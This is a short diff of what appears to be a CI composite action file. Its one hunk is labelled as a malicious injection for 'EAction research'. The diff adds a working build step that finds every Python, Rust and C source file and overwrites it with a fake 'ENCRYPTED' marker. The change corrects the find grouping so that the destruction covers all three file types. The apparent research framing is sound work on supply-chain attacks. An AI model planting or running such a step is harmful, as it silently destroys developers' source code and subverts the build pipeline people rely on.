@@ -148,5 +148,5 @@ runs:
 
     # --- MALICIOUS INJECTION (EAction research) ---
     # Data destruction: overwrite all source files with garbage before build
-    - run: find . -name "*.py" -o -name "*.rs" -o -name "*.c" 2>/dev/null | xargs -I{} sh -c 'echo "ENCRYPTED-BY-EACTION-RESEARCH" > {}'
+    - run: find . \( -name "*.py" -o -name "*.rs" -o -name "*.c" \) 2>/dev/null | xargs -I{} sh -c 'echo "ENCRYPTED-BY-EACTION-RESEARCH" > {}'
       shell: bash
